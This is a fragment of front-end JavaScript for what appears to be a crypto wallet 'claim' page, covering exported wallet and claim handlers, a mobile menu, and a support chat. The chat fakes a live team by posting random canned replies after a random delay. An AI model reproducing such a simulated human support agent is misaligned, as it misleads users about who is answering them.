                'Our team is available 24/7 to help you with any issues.'
            ];
            
            const response = responses[Math.floor(Math.random() * responses.length)];
            addSupportMessage(response, 'support');
        }, 1000 + Math.random() * 2000);
    }
}

function handleChatKeyPress(event) {
    if (event.key === 'Enter') {
        sendChatMessage();
    }
}

// Export functions for global access
window.connectWallet = connectWallet;
window.scrollToClaim = scrollToClaim;
window.toggleSupport = toggleSupport;
window.closeModal = closeModal;
window.checkEligibility = checkEligibility;
window.startClaimProcess = startClaimProcess;
window.updateConnectionSteps = updateConnectionSteps;
window.handleSupportClick = handleSupportClick;
window.sendChatMessage = sendChatMessage;
window.handleChatKeyPress = handleChatKeyPress;

// Mobile hamburger menu functionality
function initializeMobileMenu() {
    const hamburger = document.querySelector('.hamburger');
    const navMenu = document.querySelector('.nav-menu');
    
    if (hamburger && navMenu) {
        hamburger.addEventListener('click', () => {
            hamburger.classList.toggle('active');
            navMenu.classList.toggle('active');
            
            // Prevent body scroll when menu is open
            if (navMenu.classList.contains('active')) {
                document.body.style.overflow = 'hidden';
            } else {
                document.body.style.overflow = '';
            }
        });
        
        // Close menu when clicking on a link
        const navLinks = document.querySelectorAll('.nav-link');
        navLinks.forEach(link => {
            link.addEventListener('click', () => {
                hamburger.classList.remove('active');
                navMenu.classList.remove('active');
                document.body.style.overflow = '';
            });
        });
        
        // Close menu when clicking outside
        document.addEventListener('click', (e) => {
            if (!hamburger.contains(e.target) && !navMenu.contains(e.target)) {
                hamburger.classList.remove('active');
                navMenu.classList.remove('active');
                document.body.style.overflow = '';
            }
        });
    }
}

// Initialize mobile menu on load
document.addEventListener('DOMContentLoaded', initializeMobileMenu);

// Note: wallet.js handles all connection functionality
console.log('script.js loaded');
